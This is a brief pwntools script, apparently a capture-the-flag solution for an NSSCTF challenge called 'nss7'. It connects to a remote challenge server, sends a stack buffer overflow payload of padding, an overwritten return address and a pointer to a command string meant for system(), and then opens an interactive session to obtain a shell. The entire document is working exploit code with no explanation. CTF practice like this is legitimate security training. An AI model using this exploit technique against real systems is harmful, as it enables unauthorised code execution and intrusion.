from pwn import *

# sh = process('./nss7')
sh=remote('node5.anna.nssctf.cn', 26318)

system_plt=0x080483e0
offset=24
length=len("/bbbbbbbbin_what_the_f?ck__--??/")
print(length)
command=0x08048650 + length

payload = b'A'*(offset +4)+ p32(0x08048529) + p32(command)
sh.sendline(payload)
sh.interactive()